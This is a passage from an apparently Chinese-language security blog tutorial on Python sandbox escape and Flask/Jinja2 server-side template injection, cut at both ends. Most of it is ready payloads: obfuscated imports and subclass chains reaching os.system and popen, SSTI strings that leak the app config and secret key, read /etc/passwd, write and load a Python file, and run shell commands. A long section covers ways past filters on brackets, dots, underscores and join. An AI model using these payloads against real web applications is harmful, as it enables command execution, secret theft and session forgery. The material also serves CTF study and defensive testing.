class="hljs-number">0</span>].__subclasses__()[-<span class="hljs-number">4</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;ls&#x27;</span>)().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">93</span>].__init__.__globals__[<span class="hljs-string">&quot;sys&quot;</span>].modules[<span class="hljs-string">&quot;os&quot;</span>].system(<span class="hljs-string">&quot;ls&quot;</span>)<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">104</span>].__init__.__globals__[<span class="hljs-string">&quot;sys&quot;</span>].modules[<span class="hljs-string">&quot;os&quot;</span>].system(<span class="hljs-string">&quot;ls&quot;</span>)[].__class__.__base__.__subclasses__()[<span class="hljs-number">127</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div><h1 id="逃逸绕过方法"><a href="#逃逸绕过方法" class="headerlink" title="逃逸绕过方法"></a><strong>逃逸绕过方法</strong></h1><h2 id="0x01-花式import-amp-import-混淆"><a href="#0x01-花式import-amp-import-混淆" class="headerlink" title="0x01 花式import&amp;import 混淆"></a>0x01 花式import&amp;import 混淆</h2><p>首先，禁用 <code>import os</code> 肯定是不行的，因为</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span>  os<span class="hljs-keyword">import</span>   os<span class="hljs-keyword">import</span>    os...</code></pre></div><p>都可以。如果多个空格也过滤了，Python 能够 import 的可不止 <code>import</code>，还有 <code>__import__</code>：<code>__import__(&#39;os&#39;)</code>，<code>__import__</code>被干了还有 <code>importlib</code>：<code>importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code></p><p>这样就安全了吗？实际上<code>import</code>可以通过其他方式完成。回想一下 import 的原理，本质上就是执行一遍导入的库。这个过程实际上可以用 <code>execfile</code> 来代替：</p><div class="hljs code-wrapper"><pre><code class="hljs python">execfile(<span class="hljs-string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div><p>不过要注意，2.x 才能用，3.x 删了 execfile，不过可以这样：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:    exec(f.read())system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div><p>这个方法倒是 2.x、3.x 通用的。</p><p>不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下，：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sysprint(sys.path)</code></pre></div><p>比如通过正则匹配之类的，拒绝<code>import os</code>、<code>import commands</code>之类的语句出现</p><p>这是最低级的一种防御措施，可以通过一些编码来进行混淆</p><div class="hljs code-wrapper"><pre><code class="hljs python">f3ck = <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;pbzznaqf&quot;</span>.decode(<span class="hljs-string">&#x27;rot_13&#x27;</span>))<span class="hljs-built_in">print</span> f3ck.getoutput(<span class="hljs-string">&#x27;ifconfig&#x27;</span>)</code></pre></div><p>或者配合<code>getattr</code>函数</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> codecs<span class="hljs-built_in">getattr</span>(os,codecs.encode(<span class="hljs-string">&quot;flfgrz&quot;</span>,<span class="hljs-string">&#x27;rot13&#x27;</span>))(<span class="hljs-string">&#x27;ifconfig&#x27;</span>)</code></pre></div><h2 id="0x02-花式处理字符串"><a href="#0x02-花式处理字符串" class="headerlink" title="0x02 花式处理字符串"></a>0x02 花式处理字符串</h2><p>代码中要是出现 <code>os</code>，直接不让运行。那么可以利用字符串的各种变化来引入 os：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]).system(<span class="hljs-string">&#x27;ls&#x27;</span>)b = <span class="hljs-string">&#x27;o&#x27;</span>a = <span class="hljs-string">&#x27;s&#x27;</span><span class="hljs-built_in">__import__</span>(a+b).system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div><p>还可以利用 <code>eval</code> 或者 <code>exec</code>：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>])macr0phag3<span class="hljs-number">0</span><span class="hljs-meta">&gt;&gt;&gt; </span>exec(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="hljs-number">1</span>])macr0phag3</code></pre></div><p>顺便说一下，eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、变量拼接、base64、hex、rot13…等等，太多了。。。</p><h2 id="0x02-花式执行函数"><a href="#0x02-花式执行函数" class="headerlink" title="0x02 花式执行函数"></a>0x02 花式执行函数</h2><p>通过上面内容我们很容易发现，光引入 os 只不过是第一步，如果把 system 这个函数干掉，也没法通过<code>os.system</code>执行系统命令，并且这里的<code>system</code>也不是字符串，也没法直接做编码等等操作。我遇到过一个环境，直接在<code>/usr/lib/python2.7/os.py</code>中删了<code>system</code>函数。。。</p><p>不过，要明确的是，os 中能够执行系统命令的函数有很多：</p><div class="hljs code-wrapper"><pre><code class="hljs lua"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))<span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) <span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.popen2(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) # <span class="hljs-number">2.</span>x<span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.popen3(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) # <span class="hljs-number">2.</span>x<span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.popen4(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) # <span class="hljs-number">2.</span>x...</code></pre></div><p>应该还有一些，可以在这里找找：</p><p><a href="https://docs.python.org/2/library/os.html">2.x 传送门</a></p><p><a href="https://docs.python.org/3/library/os.html">3.x 传送门</a></p><p>过滤<code>system</code>的时候说不定还有其他函数给漏了。</p><p>其次，可以通过 <code>getattr</code> 拿到对象的方法、属性：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<span class="hljs-built_in">getattr</span>(os, <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)</code></pre></div><p>不让出现 import也没事：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(__builtins__, <span class="hljs-string">&#x27;__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]), <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)macr0phag3<span class="hljs-number">0</span></code></pre></div><p>一样可以。这个方法同样可以用于逃逸过滤 import 的沙箱。关于 <code>__builtins__</code>，见下文。</p><p>与 <code>getattr</code> 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性/方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code>，还找不到则报错。更具体的这里就不解释了，有兴趣的话可以搜搜。</p><h2 id="0x03-删除了-builtins-中的函数"><a href="#0x03-删除了-builtins-中的函数" class="headerlink" title="0x03 删除了__builtins__中的函数"></a>0x03 删除了<code>__builtins__</code>中的函数</h2><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> targets:    <span class="hljs-keyword">del</span> __builtins__.__dict__[x]</code></pre></div><p>可以通过reload重新导入<code>__builtins__</code>模块<code>reload(__builtin__)</code></p><p>reload也是<code>__builtins__</code>中的一个函数，假如它也被删了的话，还可以尝试一个imp的模块</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> impimp.reload(__builtin__)</code></pre></div><h2 id="0x04-修改了sys-modules"><a href="#0x04-修改了sys-modules" class="headerlink" title="0x04 修改了sys.modules"></a>0x04 修改了sys.modules</h2><p>由于import导入包时，是从sys.path中去导入对应的包<br>防御者可能会对其进行修改，导致无法导入想要的模块</p><p>这时可以自己尝试修改模块的位置<code>sys.modules[&#39;os&#39;]=&#39;/usr/lib/python2.7/os.py&#39;</code><br>或者尝试运行一遍<code>os.py</code>，也就相当于导入了一次os模块</p><div class="hljs code-wrapper"><pre><code class="hljs python">execfile(<span class="hljs-string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</code></pre></div><h2 id="0x05-base64编码"><a href="#0x05-base64编码" class="headerlink" title="0x05 base64编码"></a>0x05 base64编码</h2><p>对关键字进行base64编码可绕过一些明文检测机制：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> base64<span class="hljs-meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="hljs-string">&#x27;__import__&#x27;</span>)<span class="hljs-string">&#x27;X19pbXBvcnRfXw==&#x27;</span><span class="hljs-meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-string">&#x27;b3M=&#x27;</span><span class="hljs-meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="hljs-string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)](<span class="hljs-string">&#x27;b3M=&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)).system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-number">0</span></code></pre></div><h1 id="flask-SSTI"><a href="#flask-SSTI" class="headerlink" title="flask SSTI"></a>flask SSTI</h1><p>flask的ssti的利用方式与沙箱逃逸有所不同，一方面是无法直接写入python代码，但是利用<strong>继承关系</strong>那一套依旧适用，另一方面，<strong>模板语法</strong>以及flask框架所引入的类也是可以进行利用的。</p><p>常见考点<strong>为读配置</strong>和进行<strong>代码执行</strong>。</p><h2 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h2><h3 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h3><p>Flask是一个使用Python编写的轻量级Web应用框架。其 WSGI 工具箱采用Werkzeug，模板引擎则使用Jinja2。</p><h3 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h3><p>Jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。</p><p>在Jinja2中，存在三种语句：</p><div class="hljs code-wrapper"><pre><code class="hljs crystal">控制结构 <span class="hljs-template-variable">&#123;% %&#125;</span>变量取值 <span class="hljs-template-variable">&#123;&#123; &#125;&#125;</span>注释 &#123;<span class="hljs-comment"># #&#125;</span></code></pre></div><p>Jinja2模板中使用上述第二种的语法表示一个变量，它是一种特殊的占位符。当利用Jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，Jinja2支持Python中所有的Python数据类型比如列表、字段、对象等。被两个括号包裹的内容会输出其表达式的值。</p><p>Jinja2中的过滤器可以理解为是Jinja2里面的内置函数和字符串处理函数。</p><h3 id="模板渲染函数"><a href="#模板渲染函数" class="headerlink" title="模板渲染函数"></a>模板渲染函数</h3><h4 id="render-template"><a href="#render-template" class="headerlink" title="render_template()"></a>render_template()</h4><p>使用render_template()方法可以渲染模板，你只要提供模板名称和需要作为参数传递给模板的变量就行了。</p><p>渲染过程如下，render_template()函数的第一个参数为渲染的目标html页面、第二个参数为需要加载到页面指定标签位置的内容，来自网上摘的一个图：</p><p><img src="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E6%9E%90Python-Flask-SSTI/1.png" alt="img"></p><p>其实render_template()的功能是先引入home.html，同时根据后面传入的参数，对html进行修改渲染。</p><p>注意：当在HTML模板中在标签内传入的内容是通过如``而非%s这种传参形式时，HTML自动转义默认开启。因此，如果 name 包含 HTML ，那么会被自动转义。</p><h2 id="0x02-上下文和全局变量"><a href="#0x02-上下文和全局变量" class="headerlink" title="0x02 上下文和全局变量"></a>0x02 上下文和全局变量</h2><p>默认情况下，Jinja2模板中提供以下全局变量：</p><ul><li><code>config</code>，当前配置对象</li><li><code>request</code>，当前请求对象</li><li><code>session</code>，当前会话对象</li><li><code>g</code>，全局变量的请求绑定对象。开发人员通常使用它在请求期间存储资源。</li><li>get_flashed_messages</li><li>url_for</li><li>application</li></ul><p>如果要详细了解它们的全局变量，请访问以下API文档链接：<a href="http://flask.pocoo.org/docs/1.0/templating/#standard-context">Flask</a>和<a href="http://jinja.pocoo.org/docs/dev/templates/#builtin-globals">Jinja</a>。</p><h2 id="0x03-敏感信息泄露"><a href="#0x03-敏感信息泄露" class="headerlink" title="0x03 敏感信息泄露"></a>0x03 敏感信息泄露</h2><p>访问对应的全局变量即可直接泄露出配置文件的内容。</p><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>比如config变量：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/7.png" alt="img"></p><p>某些情况下，当获取secret_key后，即可对session进行重新签名，完成session的伪造。</p><p>注意：Flask的session是保存在客户端，称为客户端session，会进行编码和校验。</p><p>整合一下可利用的PoC技巧：</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">?name&#x3D;&#123;&#123;config&#125;&#125;?name&#x3D;&#123;&#123;person.secret&#125;&#125;?name&#x3D;&#123;&#123;self.__dict__&#125;&#125;?name&#x3D;&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;?name&#x3D;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</code></pre></div><h2 id="0x04-读写文件"><a href="#0x04-读写文件" class="headerlink" title="0x04 读写文件"></a>0x04 读写文件</h2><p>这里需要用到Python沙箱逃逸的元素链，这里直接给出payload，具体构造过程可参考<a href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/">《Python沙箱逃逸小结》</a>。</p><p><strong>读文件</strong></p><p>这里只给个演示的poc，其他绕过类的poc参考<a href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/">《Python沙箱逃逸小结》</a>构造即可：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Python2</span>?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;E:/passwd&#x27;).read()&#125;&#125;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()<span class="hljs-comment"># Python3中无file，只能用open</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()</code></pre></div><h2 id="0x05-代码执行"><a href="#0x05-代码执行" class="headerlink" title="0x05 代码执行"></a>0x05 代码执行</h2><h3 id="利用from-pyfile加载对象到Flask配置环境"><a href="#利用from-pyfile加载对象到Flask配置环境" class="headerlink" title="利用from_pyfile加载对象到Flask配置环境"></a>利用from_pyfile加载对象到Flask配置环境</h3><p>这种利用方式算是一种简单的漏洞组合拳。</p><p>先利用文件写入漏洞写一个Python文件：</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;E:&#x2F;m7.py&#39;,&#39;w&#39;).write(&#39;from subprocess import check_output\nRUNCMD&#x3D;check_output\n&#39;)&#125;&#125;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/11.png" alt="img"></p><p>然后使用config.from_pyfile将该Python文件加载到config变量中：</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">?name&#x3D;&#123;&#123;config.from_pyfile(&#39;E:&#x2F;m7.py&#39;)&#125;&#125;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/12.png" alt="img"></p><p>访问全局变量config查看是否加载成功：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/13.png" alt="img"></p><p>加载成功后，就可以通过以下形式执行任意命令了：</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">?name&#x3D;&#123;&#123;config[&#39;RUNCMD&#39;](&#39;whoami&#39;)&#125;&#125;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/14.png" alt="img"></p><p>可知，这种利用方式是直接有回显的。</p><h3 id="利用元素链中可利用的命令执行函数"><a href="#利用元素链中可利用的命令执行函数" class="headerlink" title="利用元素链中可利用的命令执行函数"></a>利用元素链中可利用的命令执行函数</h3><p>元素链的payload就很多，具体看<a href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/">《Python沙箱逃逸小结》</a>来进行各种payload的构造就好，这里只给出几个简单的示例：</p><p>os.system()的利用是无回显的：</p><div class="hljs code-wrapper"><pre><code class="hljs handlebars"><span class="xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(<span class="hljs-name">&#x27;calc&#x27;</span>)&#125;&#125;</span></code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/15.png" alt="img"></p><p>要想有回显，可利用如下几个：</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2"># os.popen(cmd).read()?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].popen(&#39;whoami&#39;).read()&#125;&#125;# platform.popen(cmd).read()?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;platform&#39;).popen(&#39;whoami&#39;).read()&#125;&#125;# sys.modules间接调用前面两个模块?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;sys&#39;).modules[&#39;os&#39;].popen(&#39;whoami&#39;).read()&#125;&#125;?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;sys&#39;).modules[&#39;platform&#39;].popen(&#39;whoami&#39;).read()&#125;&#125;</code></pre></div><p><strong>也可利用jinja2中特有的全局变量request等。</strong></p><p>在大多数示例中，我们用来<code>request.args</code>访问GET参数，但是可以使用自定义值填充其他字典：</p><ul><li>GET： <code>request.args</code></li><li>Cookie： <code>request.cookies</code></li><li>headers： <code>request.headers</code></li><li>environ： <code>request.environ</code></li><li>POST： <code>request.values</code></li></ul><p>以下符号可用于访问对象的属性：</p><ul><li><code>request.__class__</code></li><li><code>request[&quot;__class__&quot;]</code></li><li><code>request|attr(&quot;__class__&quot;)</code></li></ul><p>数组元素可以通过以下方式访问：</p><ul><li><code>array[0]</code></li><li><code>array.pop(0)</code></li></ul><h2 id="0x06-利用request类"><a href="#0x06-利用request类" class="headerlink" title="0x06 利用request类"></a><strong>0x06 利用request类</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;</code></pre></div><p>本地环境遇到字符串就直接gg，可能是jinja2不支持直接使用引号的字符串。</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">192.168.133.180:5000&#x2F;?exploit&#x3D;&#123;&#123;request.application.__globals__.__builtins__.__import__(request.args.x1).popen(request.args.x2).read()&#125;&#125;&amp;x1&#x3D;os&amp;x2&#x3D;whoami</code></pre></div><h1 id="flask-SSTI绕过方法"><a href="#flask-SSTI绕过方法" class="headerlink" title="flask SSTI绕过方法"></a><strong>flask SSTI绕过方法</strong></h1><h2 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了[]"></a>过滤了<code>[]</code></h2><ul><li><strong>调用<code>__getitem__()</code>函数直接替换；</strong></li><li>调用pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；</li></ul><p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()</code></pre></div><p>在这里使用 pop 函数并不会真的移除，但却能返回其值，取代中括号来实现绕过。</p><p>如：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 原型</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-comment"># __getitem__()替换中括号[]</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__().__getitem__(<span class="hljs-number">59</span>).__init__.__globals__.__getitem__(<span class="hljs-string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="hljs-string">&#x27;__import__&#x27;</span>)(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-comment"># pop()替换中括号[]，结合__getitem__()利用</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__().pop(<span class="hljs-number">59</span>).__init__.__globals__.pop(<span class="hljs-string">&#x27;__builtins__&#x27;</span>).pop(<span class="hljs-string">&#x27;__import__&#x27;</span>)(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div><h2 id="过滤了-或者-（利用request）"><a href="#过滤了-或者-（利用request）" class="headerlink" title="过滤了.或者[]（利用request）"></a>过滤了<code>.</code>或者<code>[]</code><strong>（利用request）</strong></h2><p>若.也被过滤，使用原生 JinJa2 函数 |attr()</p><p>即将 <code>request.__class__ </code>改成<code> request|attr(&quot;__class__&quot;)</code> </p><p>过滤了<code>.</code>可以使用字典的方式</p><p>比如：</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;</code></pre></div><p>换成</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5f&#39;][&#39;\x5f\x5fbuiltins\x5f\x5f&#39;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;id&#39;)[&#39;read&#39;]()&#125;&#125;</code></pre></div><h2 id="过滤下划线-（利用request）"><a href="#过滤下划线-（利用request）" class="headerlink" title="过滤下划线 _（利用request）"></a>过滤下划线 _<strong>（利用request）</strong></h2><p>flask中</p><p><strong>利用 request.args 的属性</strong></p><div class="hljs code-wrapper"><pre><code class="hljs python">&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre></div><p>将其中的 request.args 改为 request.values，则利用 post 的方式进行传参。</p><p>GET:</p><div class="hljs code-wrapper"><pre><code class="hljs python">&#123;&#123; <span class="hljs-string">&#x27;&#x27;</span>[request.value.<span class="hljs-keyword">class</span>][request.value.mro][<span class="hljs-number">2</span>][request.value.subclasses]()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;</code></pre></div><p>POST:</p><div class="hljs code-wrapper"><pre><code class="hljs python">class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre></div><p><strong>也可以利用十六进制</strong></p><p>更为简便</p><p>原payload</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5f&#39;][&#39;\x5f\x5fbuiltins\x5f\x5f&#39;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;id&#39;)[&#39;read&#39;]()&#125;&#125;</code></pre></div><h2 id="同时过滤了-和request-request以及-利用-join"><a href="#同时过滤了-和request-request以及-利用-join" class="headerlink" title="同时过滤了.和request[request以及_(利用|join)"></a>同时过滤了<code>.</code>和<code>request[request</code>以及<code>_</code><strong>(利用<code>|join</code>)</strong></h2><p>当上述三种都被过滤了，下面这种payload就失效了</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;192.168.133.180:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr(request.args.param&#125;&#125;&amp;param&#x3D;__class__</code></pre></div><p>我们需要找到可以走私<code>__class__</code>的方法，jinja2中的过滤器join可以满足要求</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_</code></pre></div><h2 id="过滤了-、-和request-request以及"><a href="#过滤了-、-和request-request以及" class="headerlink" title="过滤了[]、.和request[request以及_"></a>过滤了<code>[]</code>、<code>.</code>和<code>request[request</code>以及<code>_</code></h2><p>在上述的基础上，加入了<code>[]</code>，上述的payload就无法使用了，列表无法使用了，但是join支持元组</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_</code></pre></div><p>但是，它有点丑陋且很长。使用该<code>.getlist()</code>函数，我们可以将其缩短一点：</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr(request.args.getlist(request.args.l)|join)&#125;&#125;&amp;l&#x3D;a&amp;a&#x3D;_&amp;a&#x3D;_&amp;a&#x3D;class&amp;a&#x3D;_&amp;a&#x3D;_</code></pre></div><h2 id="过滤了-join（利用-format）"><a href="#过滤了-join（利用-format）" class="headerlink" title="过滤了|join（利用|format）"></a>过滤了<code>|join</code><strong>（利用<code>|format</code>）</strong></h2><p>上面的绕过都是基于join，如果其被过滤了，我们可以使用format</p><p>在相同的查询字符串paramters<code>&amp;a=_</code>我们可以形成一个格式字符串，将导致<code>__class__</code>：<code>%s%sclass%s%s</code><br>该<code>%s</code>标识符将与传递的字符串替换。我们的新攻击向量如下所示：</p><div class="hljs code-wrapper"><pre><code class="hljs 